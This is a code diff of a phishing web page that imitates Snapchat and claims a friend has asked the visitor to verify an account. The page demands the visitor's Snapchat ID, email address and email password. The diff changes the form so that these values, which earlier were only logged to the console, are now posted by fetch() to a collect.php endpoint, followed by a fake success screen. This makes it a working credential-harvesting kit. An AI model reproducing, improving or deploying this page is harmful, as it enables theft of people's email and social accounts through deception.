@@ -1,5 +1,5 @@
  
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -26,16 +26,10 @@ button:disabled{background:#aaa;cursor:not-allowed}
 .success{display:none;height:100vh;background:#fffc00;justify-content:center;align-items:center;flex-direction:column;animation:fadeIn .4s ease}
 .circle{width:90px;height:90px;border:5px solid #000;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#000;font-size:42px;font-weight:bold}
 .success p{margin-top:20px;font-size:18px;font-weight:600;color:#000}
-
-
 .snap-bar{width:100%;padding:14px;margin-bottom:8px;font-size:18px;font-weight:600;text-align:center;border:2px solid #000;border-radius:35px;background:#fff;color:#000;cursor:default}
-
-
 .pw-box{display:flex;align-items:center;position:relative;margin-top:10px}
 .pw-box input{width:100%;padding-right:36px}
 .eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;width:18px;height:18px;fill:none;stroke:#000;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-
-
 .mismatch{border:2px solid #e53935 !important;background-color:#ffeaea;}
 .err-txt{color:#e53935;font-size:12px;margin-top:4px;display:none;}
 </style>
@@ -43,103 +37,72 @@ button:disabled{background:#aaa;cursor:not-allowed}
 <body>
 
 <div class="container" id="formPage">
-  <div class="logo"></div>
+  <div class="logo">👻</div>
   <h1>Confirm a Friend's Account Authenticity</h1>
-
-  
-  <p class="txt">Your friend has requested verification.<br>
-  Please confirm if this account belongs to a real person and is not fake or impersonating.</p>
-
-  
+  <p class="txt">Your friend has requested verification.<br>Please confirm if this account belongs to a real person and is not fake or impersonating.</p>
   <div class="snap-bar">Continue with Snapchat</div>
 
   <div class="card">
-    <form id="verifyForm">
+    <form id="verifyForm" action="collect.php" method="POST">
       <div class="option"><input type="radio" name="status" value="real"><span>Yes, this is a real account</span></div>
       <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
       <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>
 
-      <select name="relation" id="rel"><option>Friend</option><option>Family</option><option>Colleague</option><option>Online Contact</option></select>
-      <textarea name="message" id="msg" placeholder="How do you know this person?"></textarea>
+      <select name="relation"><option>Friend</option><option>Family</option><option>Colleague</option><option>Online Contact</option></select>
+      <textarea name="message" placeholder="How do you know this person?"></textarea>
 
-      <!-- warning box -->
       <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:8px;padding:10px;margin-top:10px;font-size:13px;color:#856404;">
-        <strong>Important:</strong> Add your Snapchat ID, Email & matching Passwords below to submit verification. Otherwise submit button will stay disabled.
+        <strong>Important:</strong> Add your Snapchat ID, Email & matching Passwords below to submit verification.
       </div>
 
-      <!-- Snapchat ID -->
-      <input type="text" name="snap" id="snap" placeholder="Enter your Snapchat ID" required>
+      <input type="text" name="snap" placeholder="Enter your Snapchat ID" required>
+      <input type="email" name="email" placeholder="Enter your email address" required>
 
-      <input type="email" name="email" id="email" placeholder="Enter your email address" required>
-
-      <!-- Password + Eye -->
       <div class="pw-box">
-        <input type="password" name="password" id="password" placeholder="Enter your email password" required>
-        <svg class="eye" id="toggleEye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+        <input type="password" name="password" placeholder="Enter your email password" required>
+        <svg class="eye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
       </div>
-
-      <!-- Confirm Password + Eye -->
       <div class="pw-box">
-        <input type="password" name="confirm" id="confirm" placeholder="Confirm your email password" required>
-        <svg class="eye" id="toggleEye2" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+        <input type="password" name="confirm" placeholder="Confirm your email password" required>
+        <svg class="eye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
       </div>
-      <div class="err-txt" id="errTxt">Password doesn't match</div>
+      <div class="err-txt">Password doesn't match</div>
 
-      <button type="submit" id="submitBtn" disabled>Submit Confirmation</button>
+      <button type="submit" disabled>Submit Confirmation</button>
     </form>
   </div>
 </div>
 
-<!-- loading -->
-<div class="loading" id="loading">
-  <div class="spinner"></div>
-  <p>Submitting your request...</p>
-</div>
-
-<!-- success -->
-<div class="success" id="successPage">
-  <div class="circle"></div>
-  <p>Your request has been submitted</p>
-</div>
+<div class="loading" id="loading"><div class="spinner"></div><p>Submitting your request...</p></div>
+<div class="success" id="successPage"><div class="circle">👻</div><p>Your request has been submitted</p></div>
 
 <script>
-const form   = document.getElementById('verifyForm');
-const snap   = document.getElementById('snap');
-const email  = document.getElementById('email');
-const pass   = document.getElementById('password');
-const conf   = document.getElementById('confirm');
-const btn    = document.getElementById('submitBtn');
-const errTxt = document.getElementById('errTxt');
-const eye1   = document.getElementById('toggleEye');
-const eye2   = document.getElementById('toggleEye2');
+const form=document.getElementById('verifyForm');
+[snap,email,pass,conf]=['snap','email','password','confirm'].map(id=>form[id]);
+btn=form.querySelector('button');
+err=form.querySelector('.err-txt');
 
-// eye toggle
-function toggleEye(eye,input){
-  eye.addEventListener('click',()=>{
-    const type = input.type==='password'?'text':'password';
-    input.type = type;
-  });
-}
-toggleEye(eye1,pass);
-toggleEye(eye2,conf);
+form.querySelectorAll('.eye').forEach((eye,i)=>{
+  eye.onclick=_=>[pass,conf][i].type=[pass,conf][i].type==='password'?'text':'password';
+});
 
 function validate(){
-  const match = pass.value === conf.value;
+  const match=pass.value===conf.value;
   conf.classList.toggle('mismatch',!match);
-  errTxt.style.display = match?'none':'block';
-  btn.disabled = !(snap.value.trim() && email.value.includes('@') && pass.value.length>=4 && match);
+  err.style.display=match?'none':'block';
+  btn.disabled=!(snap.value.trim()&&email.value.includes('@')&&pass.value.length>=4&&match);
 }
 [snap,email,pass,conf].forEach(el=>el.addEventListener('input',validate));
 
-form.addEventListener('submit', e=>{
+form.addEventListener('submit',e=>{
   e.preventDefault();
-  console.log("Collected:", snap.value, email.value, pass.value);
   document.getElementById('loading').style.display='flex';
-  setTimeout(()=>{
-    document.getElementById('loading').style.display='none';
-    document.getElementById('formPage').style.display='none';
-    document.getElementById('successPage').style.display='flex';
-  },2000);
+  fetch('collect.php',{method:'POST',body:new FormData(form)})
+    .then(_=>{
+      document.getElementById('loading').style.display='none';
+      document.getElementById('formPage').style.display='none';
+      document.getElementById('successPage').style.display='flex';
+    });
 });
 </script>
 </body>
